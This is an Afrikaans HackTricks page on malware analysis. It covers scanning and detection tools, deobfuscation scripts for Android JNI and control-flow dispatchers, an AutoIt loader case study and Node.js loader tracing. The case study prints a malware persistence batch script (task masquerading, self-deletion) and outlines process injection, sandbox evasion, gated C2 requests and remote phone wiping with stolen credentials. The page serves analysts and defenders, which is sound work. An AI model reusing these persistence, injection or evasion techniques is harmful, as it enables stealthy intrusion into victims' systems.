# Malware-ontleding

{{#include ../../banners/hacktricks-training.md}}

## Forensiese CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Aanlyn Dienste

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline Antivirus- en Opsporingsgereedskap

### Yara

#### Installeer
```bash
sudo apt-get install -y yara
```
#### Berei reëls voor

Gebruik hierdie script om alle yara malware rules van github af te laai en saam te voeg: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Skep die _**rules**_ directory en voer dit uit. Dit sal 'n lêer genaamd _**malware_rules.yar**_ skep wat al die yara rules vir malware bevat.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skandeer
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Kontroleer vir malware en skep reëls

Jy kan die instrument [**YaraGen**](https://github.com/Neo23x0/yarGen) gebruik om yara rules uit 'n binêre lêer te genereer. Kyk na hierdie handleidings: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installeer
```
sudo apt-get install -y clamav
```
#### Skandering
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detecteer moontlik kwaadwillige **capabilities** in uitvoerbare lêers: PE, ELF, .NET. Dit sal dinge soos Att\&ck tactics vind, of verdagte capabilities soos:

- check for OutputDebugString error
- run as a service
- create process

Kry dit in die [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC beteken Indicator Of Compromise.\
’n IOC is ’n stel **voorwaardes wat identifiseer** sekere moontlik ongewenste sagteware of bevestigde **malware**. Blue Teams gebruik hierdie soort definisie om **te soek na hierdie soort kwaadwillige lêers** in hul **sisteme** en **netwerke**.\
Om hierdie definisies te deel is baie nuttig, want wanneer malware in ’n rekenaar geïdentifiseer word en ’n IOC vir daardie malware geskep word, kan ander Blue Teams dit gebruik om die malware vinniger te identifiseer.

’n hulpmiddel om IOCs te skep of te wysig is [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Jy kan gereedskap soos [**Redline**](https://www.fireeye.com/services/freeware/redline.html) gebruik om **te soek na gedefinieerde IOCs op ’n toestel**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) is 'n skandeerder vir Simple Indicators of Compromise.\
Deteksie is gebaseer op vier opsporingsmetodes:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) is 'n malware-skandeerder vir Linux, vrygestel onder die GNU GPLv2-lisensie, wat ontwerp is rondom die bedreigings wat in gedeelde gehoste omgewings ervaar word. Dit gebruik bedreigingsdata van network edge intrusion detection systems om malware wat aktief in aanvalle gebruik word, te onttrek en genereer signatures vir opsporing. Verder word bedreigingsdata ook afgelei uit gebruikersindienings met die LMD checkout-funksie en malware community-bronne.

### rkhunter

Gereedskap soos [**rkhunter**](http://rkhunter.sourceforge.net) kan gebruik word om die lêerstelsel na moontlike **rootkits** en malware te ondersoek.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) is 'n instrument wat sal probeer om obfuscated strings binne executables te vind deur verskillende tegnieke.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) kontroleer 'n paar basiese dinge binne die executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) is 'n instrument wat inligting oor Windows executables verskaf, soos imports, exports, headers, maar sal ook virus total nagaan en potensiële Att\&ck tegnieke vind.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) is 'n gereedskap om te bepaal of 'n lêer **encrypted** is en ook **packers** te vind.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is 'n Python-skrip wat 'n verskeidenheid **statistiese metodes** gebruik om **obfuscated** en **encrypted** inhoud binne teks/script-lêers op te spoor. Die beoogde doel van NeoPI is om te help met die **detectie van versteekte web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) doen sy uiterste beste om **obfuscated**/**dodgy code** op te spoor, sowel as lêers wat **PHP** funksies gebruik wat dikwels in **malwares**/webshells gebruik word.

### Apple Binary Signatures

Wanneer jy 'n **malware sample** ondersoek, behoort jy altyd die **handtekening** van die binary na te gaan, aangesien die **developer** wat dit onderteken het dalk reeds met **malware** verwant is.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Opsporingstegnieke

### File Stacking

As jy weet dat 'n gids wat die **lêers** van 'n webbediener bevat, laas op 'n sekere datum bygewerk is, **kontroleer** die **datum** waarop al die **lêers** in die **webbediener** geskep en gewysig is, en as enige datum **suspek** is, ondersoek daardie lêer.

### Baselines

As die **lêers** van 'n gids **nie veronderstel was om gewysig te word nie**, kan jy die **hash** van die **oorspronklike lêers** van die gids bereken en dit **vergelyk** met die **huidige**. Enigeen wat gewysig is, sal **suspek** wees.

### Statistiese ontleding

Wanneer die inligting in logs gestoor word, kan jy **statistieke nagaan**, soos hoeveel keer elke lêer van 'n webbediener geraadpleeg is — 'n web shell mag een van die mees geraadpleegde wees.

---

### Android in-app native telemetrie (geen root)

Op Android kan jy native kode binne die teiken-app-proses instrumenteer deur 'n klein logger library voor te laai voordat ander JNI libs inisieer. Dit gee vroeë sigbaarheid in native gedrag sonder stelsel-wye hooks of root. 'n Populêre benadering is SoTap: plaas libsotap.so vir die regte ABI in die APK en injekteer vroeg 'n System.loadLibrary("sotap") oproep (bv. static initializer of Application.onCreate), en versamel dan logs vanaf interne/eksterne pade of 'n Logcat fallback.

Sien die Android native reversing bladsy vir opstelbesonderhede en logpaaie:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Sommige Android-malware en RASP-beskerpte apps verberg JNI metode name en handtekeninge deur dit tydens runtime te decodeer voordat RegisterNatives aangeroep word. Wanneer Frida/ptrace instrumentasie deur anti-debug gedood word, kan jy steeds die plaintekst offline herstel deur die in-binary decoder met angr uit te voer en dan die resultate terug in Ghidra as kommentaar te druk.

Sleutelidee: hanteer die decoder binne die .so as 'n oproepbare funksie, voer dit uit op die verborge byte-blobs in .rodata, en konkretiseer die uitset-bytes tot by die eerste \x00 (C-string terminator). Hou angr en Ghidra dieselfde image base gebruik om adres-mismatches te voorkom.

Workflow overview
- Triage in Ghidra: identifiseer die decoder en sy oproepkonvensie/argumente in JNI_OnLoad en RegisterNatives opstelling.
- Run angr (CPython3) om die decoder vir elke teiken-string uit te voer en resultate uit te skryf.
- Annotate in Ghidra: auto-comment decoded strings by elke oproepplek vir vinnige JNI-rekonstruksie.

Ghidra triage (JNI_OnLoad pattern)
- Pas JNI datatypes toe op JNI_OnLoad sodat Ghidra JNINativeMethod strukture herken.
- Tipiese JNINativeMethod volgens Oracle-dokumentasie:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Soek na oproepe na RegisterNatives. Indien die biblioteek die naam/handtekening bou met 'n plaaslike roetine (bv. FUN_00100e10) wat na 'n statiese byte-tabel verwys (bv. DAT_00100bf4) en parameters soos (encoded_ptr, out_buf, length) aanneem, is dit 'n ideale teiken vir offline-uitvoering.

angr setup (execute the decoder offline)
- Laai die .so met dieselfde basis wat in Ghidra gebruik is (voorbeeld: 0x00100000) en skakel outomatiese laai van eksterne libs af om die state klein te hou.

<details>
<summary>angr opstelling en offline decoder-uitvoering</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Op skaal bou 'n statiese kaart van call sites na die decoder se argumente (encoded_ptr, size). Wrappers kan argumente verberg, so jy kan hierdie mapping handmatig skep vanaf Ghidra xrefs as API recovery ruisend is.

<details>
<summary>Dekodeer verskeie call sites gesamentlik met angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Anoteer aanroepplekke in Ghidra
Opsie A: Slegs Jython-opmerkingsskrywer (gebruik 'n vooraf-gegenereerde JSON)
- Aangesien angr CPython3 benodig, hou deobfuskering en annotasie geskei. Hardloop eers die angr-skrip hierbo om decoded_strings.json te genereer. Hardloop dan hierdie Jython GhidraScript om PRE_COMMENTs by elke aanroepplek te skryf (en sluit die aanroeperfunksienaam vir konteks in):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opsie B: Enkele CPython-skrip via pyhidra/ghidra_bridge
- Alternatiewelik, gebruik pyhidra of ghidra_bridge om Ghidra se API te bestuur vanaf dieselfde CPython-proses wat angr uitvoer. Dit maak dit moontlik om decode_string() aan te roep en onmiddellik PRE_COMMENTs te stel sonder 'n tussentydse lêer. Die logika weerspieël die Jython-skrip: bou 'n callsite→function-kaart via ReferenceManager, dekodeer met angr, en stel kommentare.

Waarom dit werk en wanneer om dit te gebruik
- Offline-uitvoering omseil RASP/anti-debug: geen ptrace of Frida-hooks benodig om strings te herstel nie.
- Deur Ghidra en angr se base_addr op lyn te hou (bv. 0x00100000) verseker dat funksie-/data-adresse oor gereedskap ooreenstem.
- Herhaalbare resep vir decoders: behandel die transformasie as 'n suiwer funksie, ken 'n output buffer toe in 'n vars state, roep dit aan met (encoded_ptr, out_ptr, len), konkretiseer dan via state.solver.eval en parse C-strings tot by \x00.

Notas en valkuils
- Respekteer die teiken-ABI/aanroepkonvensie. angr.factory.callable kies een gebaseer op arch; as argumente skyn te verskuif, spesifiseer cc eksplisiet.
- As die decoder verwag dat output-buffers met nulles gevul is, inisialiseer outbuf met nulles in die state voor die oproep.
- Vir position-independent Android .so, voorsien altyd base_addr sodat adresse in angr ooreenstem met dié in Ghidra.
- Gebruik currentProgram.getReferenceManager() om call-xrefs te enumereer selfs al verpak die app die decoder agter dun stubs.

Vir angr basics, sien: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskering van dinamiese kontrolevloeie (JMP/CALL RAX dispatchers)

Moderne malware-families misbruik Control-Flow Graph (CFG)-obfuskering swaar: in plaas van 'n direkte jump/call bereken hulle die bestemming tydens uitvoering en voer 'n `jmp rax` of `call rax` uit. 'n Klein *dispatcher* (gewoonlik nege instruksies) stel die finale teiken afhangend van die CPU `ZF`/`CF` vlagte, en breek statiese CFG-herwinning heeltemal.

Die tegniek — gedemonstreer deur die SLOW#TEMPEST loader — kan teëgewerk word met 'n drie-stap werkvloeistroom wat slegs op IDAPython en die Unicorn CPU-emulator staatmaak.

### 1. Lokaliseer elke indirekte jump/call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Onttrek die dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emuleer dit twee keer met Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Voer `run(code,0,0)` en `run(code,1,1)` uit om die *vals* en *waar* takteikens te kry.

### 4. Patch terug 'n direkte jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Na patching, dwing IDA om die funksie weer te ontleed sodat die volledige CFG en Hex-Rays-uitset herstel word:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Merk indirekte API calls

Sodra die werklike bestemming van elke `call rax` bekend is, kan jy IDA vertel wat dit is, sodat parameter-tipes en veranderlike name outomaties teruggevind word:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktiese voordele

* Herstel die werklike CFG → dekompilasie gaan van *10* reëls na duisende.
* Skakel string-kruisverwysing & xrefs in, wat gedragsrekonstruksie eenvoudig maak.
* Skripte is herbruikbaar: drop hulle in enige loader wat deur dieselfde truuk beskerm word.

---

## AutoIt-gebaseerde loaders: .a3x ontsleuteling, Task Scheduler-maskerade en RAT-inspuiting

Hierdie indringingspatroon ketting 'n ondertekende MSI, AutoIt loaders gecompileer na .a3x, en 'n Task Scheduler-taak wat voorskyn kom as 'n goedaardige app.

### MSI → aangepaste aksies → AutoIt orkestreerder

Prosesboom en opdragte wat deur die MSI aangepaste aksies uitgevoer word:

- MsiExec.exe → cmd.exe om install.bat uit te voer
- WScript.exe om 'n misleidende foutdialoog te wys
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (plant loader, stel persistence in, maak self skoon):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (gebruiker-lokmiddel):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Belangrike artefakte en vermomming:
- Plaas AutoIt3.exe en IoKlTr.au3 in C:\Users\Public\Music
- Kopieer schtasks.exe na hwpviewer.exe (vermom as Hangul Word Processor viewer)
- Skep 'n geskeduleerde taak "IoKlTr" wat elke 1 minuut loop
- Startup LNK gesien as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Plaas modules onder %APPDATA%\Google\Browser\ subgidse wat `adb` of `adv` bevat en begin hulle via autoit.vbs/install.bat helpers

Forensiese triage wenke:
- schtasks-ontleding: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Soek na hernoemde kopieë van schtasks.exe wat saam met Task XML voorkom: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Gereelde paaie: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korreleer prosescreatie: AutoIt3.exe wat legitieme Windows-binaries lanseer (bv., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt-modules word saamgestel met `#AutoIt3Wrapper_Outfile_type=a3x` en ontsleutel ingeslote payloads voordat hulle in goedaardige prosesse ingespuit word.
- Waargenome families: QuasarRAT (ingespuit in hncfinder.exe) en RftRAT/RFTServer (ingespuit in cleanmgr.exe), sowel as RemcosRAT-modules (`Remcos\RunBinary.a3x`).
- Dekripsiepatroon: lei 'n AES-sleutel af via HMAC, ontsleutel die ingeslote blob, en spuit dan die plaintext-module in.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) van die teiken-proses (bv., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory met ontsleutelde module/shellcode
- CreateRemoteThread of QueueUserAPC om die payload uit te voer

Hunting ideas
- AutoIt3.exe wat deur MsiExec.exe of WScript.exe geparent is en system utilities spawn
- Files with `.a3x` extensions of AutoIt script runners onder openbare/gebruikers-skryfbare paadjies
- Verdagte scheduled tasks wat AutoIt3.exe of binaries wat nie deur Microsoft gesignaer is nie, uitvoer, met minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Tijdens die Windows intrusion het operateurs gesteelde Google-credentials gebruik om die slagoffer se Android-toestelle herhaaldelik te uitwis, en sodoende kennisgewings te onderdruk terwyl hulle toegang uitbrei via die slagoffer se ingelogde desktop messenger.

Operator steps (from a logged-in browser session):
- Gaan Google Account → Security → Your devices na; volg Find My Phone → Find Hub (https://www.google.com/android/find)
- Kies toestel → voer Google-wagwoord weer in → gee die opdrag "Erase device" (factory reset); herhaal om herstel te vertraag
- Opsioneel: vee alert e-posse in die gekoppelde mailbox (bv., Naver) uit om sekuriteitskennisgewings te verberg

## Tracing heavily obfuscated Node.js loaders

Aanvallers bundel toenemend JavaScript loaders binne standalone Windows-binaries wat met [`nexe`](https://github.com/nexe/nexe) saamgekompileer is, sodat die runtime saam met die skrip versend word. Die resulterende PE weeg dikwels 60–90 MB en voer uit selfs al is Node.js nie geïnstalleer nie. Tydens triage:

- Gebruik [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) om die ingeslote JavaScript uit die PE te kerf en dit aan lokale gereedskap vir statiese diffing te voer.
- Verwag 'n skyf-gebaseerde mutex in %TEMP% (GachiLoader laat 'n ewekansige <name>.lock-lêer val wat na ~5 minute verval). Deur die lêer na die sandbox te kopieer voor uitvoering kan jy oorbodige stadiums oorslaan terwyl jy steeds later payloads sien.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hook core modules binne enige Node.js-proses, laat jou toe om anti-VM probes te simuleer, en bewaar elke artefak wat die sample skryf. Start geobfuskeerde skripte deur die tracer om ontleder-beheerde instrumentasie in die call stack te hou:
```powershell
node -r .\tracer.js main.js
```
Sleutelkonfigurasie-skakelaars in `tracer.js` laat jou toe om:

- Log lêerstelsel-, onderproses- en HTTP-aktiwiteit (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Elke neergelêe lêer—soos `kidkadi.node`—word na die werkgids gekopieer voordat die malware dit verwyder.
- Oorskryf omgewings-vingerafdrukke deur realistiese RAM/CPU-tellings terug te gee, `tasklist`-uitsette te vervals, en PowerShell/WMI-antwoorde te manipuleer. Dit omseil loaders wat ≥4 GB RAM, ≥2 kerne vereis en gebruikername (`mashinesssss`, `wdagutilityaccount`, ens.), gasheernaame (`desktop-vrsqlag`, `server1` …), en prosesname (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) noukeurig ondersoek.
- Neutraliseer WMI-hardwarekontroles soos `Get-WmiObject Win32_DiskDrive` (op soek na `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blokkeer “VirtualBox Graphics Adapter”, “Hyper-V Video”, ens.) en `Win32_PortConnector`-tellings. Wanneer daardie probes “ware” hardeware rapporteer, beland sandboxes nie langer in die oneindige lus van onskadelike `Invoke-WebRequest`-oproepe na `linkedin.com`, `grok.com`, `whatsapp.com`, en soortgelyke domeine wat GachiLoader gebruik om ontledings tyd te mors nie.

### Capturing gated C2 traffic automatically

Die tracer se netwerk-hooks openbaar meerlaagse C2-verifikasie sonder om die JavaScript-obfuskasie te omkeer. In die geobserveerde veldtog doen die loader:

1. POSTs host-telemetrie na `/log` op elke hardgekodeerde C2.
2. Vra `GET /richfamily/<per-sample key>` met `X-Secret: gachifamily` om ’n Base64-gekodeerde payload-URL te kry.
3. Voer ’n finale `GET` na daardie URL uit met ’n lang per-sample `X-Secret`-header; as dit ontbreek, word `403 Forbidden` teruggegee.

Omdat die tracer volledige versoeke (headers, liggame, bestemmings) opneem, kan jy dieselfde verkeer herhaal om payloads te trek, Themida/VMProtect-shells in geheue te dumpe, en Rhadamanthys-konfigurasiedata op skaal te onttrek.

## AdaptixC2: Configuration Extraction and TTPs

Sien die toegewyde bladsy:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Verwysings

- Unit42 – Ontwikkelende taktieke van SLOW#TEMPEST: ’n diepduik in gevorderde malware-tegnieke (https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategieë vir die ontleding van native kode in Android-toepassings: Kombinasie van Ghidra en simboliese uitvoering vir kode-dekripsie en deobfuskering – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks (https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-gekoppelde APT misbruik Google Find Hub om Android-toestelle uit te vee na Windows-inbraak – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer tegniese ontleding – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC agtergrond – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing (https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
